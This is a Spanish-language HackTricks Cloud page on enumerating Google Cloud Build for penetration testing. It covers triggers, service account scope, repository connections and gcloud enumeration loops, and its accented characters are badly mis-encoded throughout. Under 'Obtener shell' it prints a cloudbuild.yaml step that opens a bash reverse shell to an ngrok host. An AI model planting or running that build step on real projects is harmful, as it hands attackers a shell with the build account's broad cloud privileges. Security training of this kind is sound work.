# GCP - Enumeraci贸n de Cloud Build

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de HackTricks en AWS)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci贸n B谩sica

Google Cloud Build es una plataforma de CI/CD gestionada que **automatiza la construcci贸n de software** y los procesos de lanzamiento, integr谩ndose con **repositorios de c贸digo fuente** y admitiendo una amplia gama de lenguajes de programaci贸n. Permite a los desarrolladores **construir, probar e implementar c贸digo autom谩ticamente** al mismo tiempo que ofrece flexibilidad para personalizar los pasos de construcci贸n y flujos de trabajo.

Cada Desencadenador de Cloud Build est谩 **relacionado con un Repositorio de Cloud o conectado directamente con un repositorio externo** (Github, Bitbucket y Gitlab).

{% hint style="success" %}
No pude ver ninguna forma de robar el token de Github/Bitbucket desde aqu铆 o desde Repositorios de Cloud porque cuando se descarga el repositorio se accede a trav茅s de una URL de [https://source.cloud.google.com/](https://source.cloud.google.com/) y Github no es accedido por el cliente.
{% endhint %}

### Eventos

Cloud Build puede ser desencadenado si:

* **Se hace push a una rama**: Especificar la rama
* **Se hace push a una nueva etiqueta**: Especificar la etiqueta
* **Pull request**: Especificar la rama que recibe el PR
* **Invocaci贸n manual**
* **Mensaje Pub/Sub**: Especificar el tema
* **Evento de Webhook**: Expondr谩 una URL HTTPS y la solicitud debe ser autenticada con un secreto

### Ejecuci贸n

Hay 3 opciones:

* Un yaml/json **especificando los comandos** a ejecutar. Por lo general: `/cloudbuild.yaml`
* Solo uno que puede ser especificado "en l铆nea" en la consola web y en la CLI
* Opci贸n m谩s com煤n
* Relevante para el acceso no autenticado
* Un **Dockerfile** para construir
* Un **Buildpack** para construir

### Permisos de SA

La **Cuenta de Servicio tiene el alcance `cloud-platform`**, por lo que puede **utilizar todos los privilegios**. Si **no se especifica una SA** (como al hacer submit) se utilizar谩 la **SA predeterminada** `<n煤m-proyecto>@cloudbuild.gserviceaccount.com`.

Por defecto no se otorgan permisos, pero es bastante f谩cil darle algunos:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Aprobaciones

Es posible configurar un Cloud Build para **requerir aprobaciones para las ejecuciones de construcci贸n** (deshabilitado de forma predeterminada).

### Conexiones y Repositorios

Las conexiones se pueden crear en:

* **GitHub:** Mostrar谩 un aviso de OAuth pidiendo permisos para **obtener un token de Github** que se almacenar谩 dentro del **Gestor de Secretos.**
* **GitHub Enterprise:** Pedir谩 instalar una **GithubApp**. Se crear谩 y almacenar谩 un **token de autenticaci贸n** de su host de GitHub Enterprise en este proyecto como un secreto del **Gestor de Secretos.**
* **GitLab / Enterprise:** Necesitas **proporcionar el token de acceso a la API y el token de acceso a la API de Lectura** que se almacenar谩n en el **Gestor de Secretos.**

Una vez que se genera una conexi贸n, puedes usarla para **vincular repositorios a los que la cuenta de Github tiene acceso**.

Esta opci贸n est谩 disponible a trav茅s del bot贸n:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Ten en cuenta que los repositorios conectados con este m茅todo est谩n **disponibles solo en Triggers que utilizan la 2陋 generaci贸n.**
{% endhint %}

### Conectar un Repositorio

Esto no es lo mismo que una **`conexi贸n`**. Esto permite **diferentes** formas de obtener **acceso a un repositorio de Github o Bitbucket** pero **no genera un objeto de conexi贸n, sino que genera un objeto de repositorio (de 1陋 generaci贸n).**

Esta opci贸n est谩 disponible a trav茅s del bot贸n:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Almacenamiento

A veces Cloud Build **generar谩 un nuevo almacenamiento para almacenar los archivos del desencadenador**. Esto sucede, por ejemplo, en el ejemplo que ofrece GCP con:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Un bucket de almacenamiento llamado [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) se crea para almacenar un archivo `.tgz` con los archivos a utilizar.

### Obtener shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Enumeraci贸n

Podr铆as encontrar **informaci贸n sensible en las configuraciones de compilaci贸n y registros**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Escalada de Privilegios

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Acceso no Autenticado

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post Explotaci贸n

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
